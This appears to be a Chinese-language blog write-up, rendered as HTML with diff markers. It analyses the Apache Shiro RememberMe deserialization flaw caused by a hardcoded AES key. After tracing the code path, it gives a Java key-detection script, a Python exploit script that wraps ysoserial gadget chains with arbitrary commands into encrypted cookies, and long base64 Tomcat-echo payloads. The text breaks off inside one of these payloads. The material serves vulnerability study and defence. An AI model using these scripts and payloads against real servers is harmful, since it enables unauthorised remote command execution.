+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261714727.png" alt="image-20220926171409484"></p>
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>shiro提供了RememberMe的功能，在应用中提供了记住用户登陆状态的功能。在分析漏洞之前需要了解几个关键的类。</p>
+<p><strong>RememberMeManager</strong></p>
+<p>接口 <code>org.apache.shiro.mgt.RememberMeManager</code>提供了 5 个方法：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261719082.png" alt="image-20220926171920930"></p>
+<p><strong>AbstractRememberMeManager</strong></p>
+<p>实现了 <code>RememberMeManager</code> 接口的抽象类 <code>AbstractRememberMeManager</code>，其中有几个重要的成员变量：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261726949.png" alt="image-20220926172645839"></p>
+<ul>
+<li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 硬编码的 AES Key，也是本次漏洞的关键点，在进行AES加解密时都需要该key。</li>
+<li><code>serializer</code>：Shiro 提供的序列化器，用来对PrincipalCollection 对象进行序列化和反序列化 。</li>
+<li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，加解密使用的key即为 DEFAULT_CIPHER_KEY_BYTES。</li>
+</ul>
+<p>看下该类的构造方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261730801.png" alt="image-20220926173040672"></p>
+<p>构造方法对<code>serializer</code>采用<code>DefaultSerializer</code>进行初始化，并设置<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为 AES 加解密的 key。</p>
+<p><strong>CookieRememberMeManager</strong></p>
+<p>Shiro 还提供了一个实现了 <code>RememberMeManager</code> 接口的实现类 <code>CookieRememberMeManager</code>，该类的位置在<code>shiro-web-1.2.4.jar!\org\apache\shiro\web\mgt\CookieRememberMeManager.class</code>中，主要的作用是实现了使用cookie记录用户信息的相关功能，其中有一个方法<code>getRememberedSerializedIdentity</code>主要的作用就是获取cookie值，并将其进行Base64 解码返回 byte 数组。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209261745490.png" alt="image-20220926174539346"></p>
+<p>在该函数上打上断点，可以看到调用栈如下，在Filter处理流程中，会调用 <code>AbstractShiroFilter#doFilterInternal</code> 方法，然后使用<code>SecurityManager</code>去创建Subject对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getRememberedSerializedIdentity:<span class="number">187</span>, CookieRememberMeManager (org.apache.shiro.web.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">393</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:<span class="number">342</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:<span class="number">846</span>, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:<span class="number">148</span>, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:<span class="number">292</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:<span class="number">359</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
+
+<p>然后通过<code>DefaultSecurityManager#resolvePrincipals</code> 方法来将subjectContext转换为PrincipalCollection，在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code>中可以看到这里调用了两个方法，一个<code>getRememberedSerializedIdentity</code>就是之前下断点的地方，该方法的作用就是获取Cookie并base64解码，然后返回一个byte数组，并将byte数组传递到第二个方法<code>convertBytesToPrincipals</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209270950467.png" alt="image-20220927095004375"></p>
+<p>看一下<code>convertBytesToPrincipals</code>方法的具体实现，这个方法中调用了两个方法，一个<code>decrype</code>，一个<code>deserialize</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271015178.png" alt="image-20220927101555033"></p>
+<p>在<code>decrype</code>方法中可以看到将会使用<code>decryptionCipherKey</code>进行解密</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271017383.png" alt="image-20220927101727302"></p>
+<p>在构造方法中调用<code>setCipherKey</code>用<code>DEFAULT_CIPHER_KEY_BYTES</code>对<code>encryptionCipherKey</code>和<code>decryptionCipherKey</code>进行赋值</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271022629.png" alt="image-20220927102241391"></p>
+<p>解密完之后回到第二个方法<code>deserialize</code>，跟进通过<code>getSerializer</code>方法获取序列化器，序列化器的默认实现是 <code>DefaultSerializer</code>，也就是这里会调用<code>DefaultSerializer#deserialize</code>方法去对byte数组进行处理</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271031053.png" alt="image-20220927103105922"></p>
+<p>在<code>DefaultSerializer#deserialize</code>方法中，会调用<code>ByteArrayInputStream</code> 将 byte 转为 <code>ObjectInputStream</code>，然后通过Java原生的反序列化对其进行反序列化 </p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271036505.png" alt="image-20220927103646343"></p>
+<p>反序列化结束后返回<code>PrincipalCollection</code>对象，并将其 set 到 <code>SubjectContext</code> 中</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271039700.png" alt="image-20220927103936545"></p>
+<p>根据上面反序列化的流程，攻击者就可以构造恶意的反序列化数据，然后使用硬编码的AES密钥进行加密，最后Base64编码放在cookie中发包即可。</p>
+<p>编写poc测试脚本</p>
+<p>首先是key检测的代码，这个检测的方法相较于其他方式较好，生成的rememberMe很短</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiroKey_check</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(simplePrincipalCollection);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(barr.toByteArray())));</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.println(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>检测的原理是：将<code>SimplePrincipalCollection</code>对象进行序列化并AES加密+Base64编码构造cookie发包，可以在<code>AbstractRememberMeManager#getRememberedPrincipals</code>中看到，这个方法有个try catch语句，try代码块就是上面说的对cookie进行解密然后反序列化，而catch则是在反序列化时如果出现异常则会执行<code>AbstractRememberMeManager#onRememberedPrincipalFailure</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271533521.png" alt="image-20220927153324403"></p>
+<p>一直跟下来就会到<code>SimpleCookie#removeFrom</code>方法，该方法就是在请求头中添加deleteMe的值</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271539949.png" alt="image-20220927153953878"></p>
+<blockquote>
+<p>那么这里就有一个方法能够来验证密钥是否为正确，在<code>getRememberedPrincipals</code>这个方法中，如果在密钥正确并且反序列化成功且返回的是PrincipalCollection对象的话，那么就不会触发异常，也就是不会带上<code>deleteMe</code>的包，所以需要找一个<code>PrincipalCollection</code>类来进行序列化发送</p>
+</blockquote>
+<p>因此可以寻找一个<code>PrincipalCollection</code>的实现类来进行构造，如下<code>SimplePrincipalCollection</code>就很适合</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271545692.png" alt="image-20220927154546603"></p>
+<p>在密钥不正确的情况下返回包如下</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271547360.png" alt="image-20220927154740204"></p>
+<p>在密钥正确的情况下返回：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271548723.png" alt="image-20220927154857518"></p>
+<p>具体细节可以参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect</a></p>
+<p>在探测出密钥之后，我们需要配合<code>ysoserial</code>工具进行漏洞利用，编写exp.py如下，将<code>ysoserial</code>工具放在exp.py同目录下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用脚本生成<code>payload</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271403669.png" alt="image-20220927140309429"></p>
+<p>在burp中发包</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271404527.png" alt="image-20220927140453336"></p>
+<p>当然，也可以生成tomcat回显利用链，将命令执行的结果直接返回</p>
+<blockquote>
+<p>组合xray的6条tomcat回显链</p>
+<p>CommonsCollectionsK1&#x2F;CommonsCollectionsK2&#x2F;CommonsBeanutils1&#x2F;CommonsBeanutils2&#x2F;Jdk7u21&#x2F;Jdk8u20</p>
+</blockquote>
+<p>下面为六条tomcat回显链的payload，需要再进行AES+Base64加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tomcatEchoPayload=&#123;&quot;CommonsCollectionsK1&quot;:&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29XRWN0SGptdmEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb1dFY3RIam12YS5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClM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dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2lQYXJhbVR5cGVzcQB+AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg=&quot;,</span><br><span class="line">                    &quot;CommonsCollectionsK2&quot;:&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAhJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhaABVfdXNlU2VydmljZXNNZWNoYW5pc21MAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAB/////wFwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vZ2RMUVpRbjZlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29nZExRWlFuNmUuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbm